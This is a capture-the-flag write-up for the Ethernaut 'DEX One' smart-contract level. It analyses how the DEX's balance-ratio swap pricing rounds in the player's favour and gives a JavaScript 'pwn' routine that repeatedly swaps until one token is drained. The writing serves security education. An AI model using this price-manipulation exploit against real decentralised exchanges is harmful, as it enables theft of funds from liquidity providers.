# [22. DEX One](https://ethernaut.openzeppelin.com/level/0xC084FC117324D7C628dBC41F17CAcAaF4765f49e)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
    _mint(msg.sender, initialSupply);
    _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

In this level, we have a Decentralized Exchange (DEX) contract. In my instance, these are the two tokens of the DEX:

- token 1: [0xc0C87488841BF66e402F431853b100A735c1db73](https://rinkeby.etherscan.io/address/0xc0C87488841BF66e402F431853b100A735c1db73)
- token 2: [0x7EdAC717C9f67727c9c13B78AcC89B7f84dcEedb](https://rinkeby.etherscan.io/address/0x7EdAC717C9f67727c9c13B78AcC89B7f84dcEedb)

We can check that we have a bit of both tokens:

```js
// we have 10 of both tokens
(await contract.balanceOf(await contract.token1(), player)).toNumber()
(await contract.balanceOf(await contract.token2(), player)).toNumber()
// DEX has 100 of both tokens
(await contract.balanceOf(await contract.token1(), contract.address)).toNumber()
(await contract.balanceOf(await contract.token2(), contract.address)).toNumber()
```

We are asked to "drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a _bad_ price of the assets". Let us take a deeper look into the swap function then:

```solidity
function swap(address from, address to, uint amount) public {
  // token addresses must be valid
  require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

  // sender must have enough balance of FROM
  require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");

  // calculate the price, we can inline the actual formula here
  // uint swapAmount = getSwapPrice(from, to, amount);
  uint swapAmount = (
    (amount * IERC20(to).balanceOf(address(this))) /
              IERC20(from).balanceOf(address(this))
    );

  // DEX takes "amount" tokens from us
  IERC20(from).transferFrom(msg.sender, address(this), amount);

  // DEX gives "swapAmount" tokens to us
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

There aren't any obvious attack vectors so far, so let us delve a bit more into the swapping formula. Let $d_t$ and $p_t$ denote the balance of DEX and Player for token $t$ respectively, $a$ denote amount, and $s$ denote swap amount. Note that all values are integers, rounded down if needed.

Since we have equal amount of both, without loss of generality, let us swap all of our token 1:

$$
a_s = p_1 \times \frac{d_{2}}{d_{1}} = 10 \times \frac{100}{100} = 10
$$

Giving us $p_1 = 0, p_2 = 20, d_1 = 110, d_2 = 90$, that is, we traded 10 of one token to 10 of the other. Now let us do the opposite with the new balances:

$$
a_s = p_2 \times \frac{d_{1}}{d_{2}} = 20 \times \frac{110}{90} = 24
$$

Woah! We just got 24 tokens for giving 20, even though they were treated equally in the previous trade. Let us try to simulate this with JS real quick and see if this goes on:

```js
function simulate(t1_dex, t2_dex, t1_player, t2_player, maxiters = 10) { 
  // price function
  const price = (to_dex, from_dex, amount) => Math.floor(amount * to_dex / from_dex)
  let a, sa;

  console.log(`
  Initial
    D1: ${t1_dex}
    D2: ${t2_dex}
    P1: ${t1_player}
    P2: ${t2_player}`)
  for (i = 1; i != maxiters && t1_dex > 0 && t2_dex > 0; ++i) {
    if (i % 2) {
      // trade 'a' amount of t1 for 'sa' amount of t2
      a = t1_player
      sa = price(t2_dex, t1_dex, a)
      if (sa > t2_dex) {
        // DEX can't have negative, re-calculate
        // sa equals t2_dex this way:
        sa = price(t2_dex, t1_dex, t1_dex)
      }

      // from (t1) changes for a amounts
      t1_player -= a;
      t1_dex += a;

      // to (t2) changes for sa amounts
      t2_player += sa;
      t2_dex -= sa;
    } else {
      // trade 'a' amount of t2 for 'sa' amount of t1
      a = t2_player
      sa = price(t1_dex, t2_dex, a)
      if (sa > t1_dex) {
        // DEX can't have negative, re-calculate
        // sa equals t1_dex this way:
        sa = price(t1_dex, t2_dex, t2_dex)
      }

      // from (t2) changes for a amounts
      t2_player -= a;
      t2_dex += a;

      // to (t1) changes for sa amounts 
      t1_player += sa;
      t1_dex -= sa;
    }
    
    console.log(
      `Trade #${i}
        D1: ${t1_dex}
        D2: ${t2_dex}
        P1: ${t1_player}
        P2: ${t2_player}
        Gave: ${a} Token ${i % 2 ? "1" : "2"}
        Took: ${sa} Token ${i % 2 ? "2" : "1"}`)
    
  }
} 
// simulate(100, 100, 10, 10);
```

In the simulation, if you do not check whether the swap amount is greater than the balance of DEX, you would try to take more money than DEX has; consequently reverting the transaction. For this reason, when we go to negative values with the initially calculated swap amount, we re-calculate so that the swap amount is exactly the balance of DEX.

In the formula:

$$
a_s = p_{from} \times \frac{d_{to}}{d_{from}} = d_{to}
$$

means that $p_{from}$ becomes $d_{from}$.

We can solve the puzzle by simply implementing the simulation above so that it actually calls the contract.

```js
async function pwn(maxiters = 10) { 
  // initial settings
  const T1 = await contract.token1()
  const T2 = await contract.token2()
  const DEX = contract.address
  const PLAYER = player
  let a, sa;
  let [t1_player, t2_player, t1_dex, t2_dex] = (await Promise.all([
      contract.balanceOf(T1, PLAYER),
      contract.balanceOf(T2, PLAYER),
      contract.balanceOf(T1, DEX),
      contract.balanceOf(T2, DEX)
    ])).map(bn => bn.toNumber())

  console.log(`
  Initial
    D1: ${t1_dex}
    D2: ${t2_dex}
    P1: ${t1_player}
    P2: ${t2_player}`)

  for (i = 1; i != maxiters && t1_dex > 0 && t2_dex > 0; ++i) { 
    if (i % 2) {
      // trade t1 to t2
      a = t1_player
      sa = (await contract.getSwapPrice(T1, T2, a)).toNumber()
      if (sa > t2_dex) {
        a = t1_dex
      }

      // make the call
      await contract.approve(contract.address, a)
      await contract.swap(T1, T2, a)
    } else {
      // trade t2 to t1
      a = t2_player
      sa = (await contract.getSwapPrice(T2, T1, a)).toNumber()
      if (sa > t1_dex) {
        a = t2_dex
      }

      // make the call
      await contract.approve(contract.address, a)
      await contract.swap(T2, T1, a)
    }

    // new balances
    ;[t1_player, t2_player, t1_dex, t2_dex] = (await Promise.all([
      contract.balanceOf(T1, PLAYER),
      contract.balanceOf(T2, PLAYER),
      contract.balanceOf(T1, DEX),
      contract.balanceOf(T2, DEX)
    ])).map(bn => bn.toNumber())

    console.log(
      `Trade #${i}
        D1: ${t1_dex}
        D2: ${t2_dex}
        P1: ${t1_player}
        P2: ${t2_player}
        Gave: ${a} Token ${i % 2 ? "1" : "2"}
        Took: ${sa} Token ${i % 2 ? "2" : "1"}`)
    
  }
}  
// await pwn()
```

Once you run the function above, it will take a series of transactions (your console will be quite colorful) to complete but in the end, DEX will have depleted one of the tokens! To confirm, you may run the 4 lines at the beginning to check the balances.
